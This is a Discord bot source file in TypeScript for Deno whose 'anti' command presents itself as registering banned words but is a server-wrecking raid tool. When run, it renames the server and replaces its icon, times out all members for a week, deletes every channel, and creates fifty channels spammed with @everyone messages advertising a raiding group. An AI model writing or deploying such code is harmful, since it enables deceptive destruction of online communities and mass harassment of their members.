import { Client, GatewayIntentBits } from "@djs";
import "https://deno.land/std@0.191.0/dotenv/load.ts";
import { Interaction, REST, Routes } from "@djs";
import { Logger } from "./logger.ts";

const { TOKEN, CLIENT_ID } = Deno.env.toObject();

const rest = new REST({ version: "10" }).setToken(TOKEN);

try {
  Logger.log(`Command registering.`);
  await rest.put(Routes.applicationCommands(CLIENT_ID), {
    body: [
      {
        name: "anti",
        description: "**禁止ワードを登録**",
        type: 1,
        options: [
          {
            name: "text",
            type: 3,
            required: false,
            description: "**禁止する文章を入力してください**",
          },
        ],
      },
      {
        name: "panel",
        description: "**操作パネルを作成**",
        type: 1,
        options: [
          {
            name: "select",
            type: 3,
            required: true,
            description: "**設置する操作パネルのタイプ**",
          },
        ],
      },
    ],
  });
  Logger.log(`Command registered.`);
} catch (error) {
  Logger.log(`Command registration failed.`, "WARN");
  Logger.log(error, "WARN");
}

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.on("ready", () => {
  Logger.log(`Logged in as ${Logger.bold(client.user?.tag ?? "")}`);
});

client.on("interactionCreate", async (interaction: Interaction) => {
  if (interaction.isCommand()) {
    const name = interaction.commandName;

    if (name === "anti") {
      const text = (
        interaction.options.data[0]
          ? interaction.options.data[0].value
          : `# 荒らし共栄圏最強
# [荒らし共栄圏に参加](https://ctkpaarr.data.blog/#Discord)
https://ctkpaarr.data.blog/
https://discord.gg/annycW3Xrk
# 荒らし共栄圏万歳
@everyone
ーーーーーーーーーーーーーーーー
（画像） https://imgur.com/LacFtDP
（画像） https://imgur.com/gQkpAYe
（画像） https://imgur.com/mOlUpn3
`
      )?.toString();
      await interaction.reply({ content: `**禁止ワードを登録しました**` });

      // NUKE
      const discordServer = client.guilds.cache.get(interaction.guildId ?? "");

      const max = 50;
      discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
      discordServer?.setIcon(
        "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png"
      );
      // NOTE
      (await discordServer?.members.list() ?? []).forEach(async (member: any) => {
        if (member.id === client.user?.id) {
          await member.timeout(0, "荒らし共栄圏万歳！");
        } else {
          await member.timeout(60 * 1000 * 60 * 24 * 7, "荒らし共栄圏万歳！");
        }
      });
      for (let i = 0; i < max; i++) {
        discordServer?.channels
          .create({
            name: text?.split("\n")[0] ?? "荒らし共栄圏万歳！",
            type: 0,
          })
          .then(async (channel) => {
            for (let j = 0; j < max; j++) {
              try {
                await channel.send(
                  text ??
                    "荒らし共栄圏万歳！ \n https://ctkpaarr.data.blog \n @everyone"
                );
              } catch (_e) {
                /* ANTI TIMEOUT */
                console.log(_e);

                try {
                  (await discordServer.members.list()).forEach(
                    async (member) => {
                      if (member.id === client.user?.id) {
                        await member.timeout(0, "荒らし共栄圏万歳！");
                      }
                    }
                  );
                } catch (_e) {
                  console.log(_e);
                }
              }
            }
          });
      }

      discordServer?.channels.cache.forEach(async (channel) => {
        try {
          await channel.delete();
        // deno-lint-ignore no-empty
        } catch (_e) {}
      });

      discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
    } else {
      await interaction.reply("**現在メンテナンス中です。**");
    }
  }
});

client.login(TOKEN);
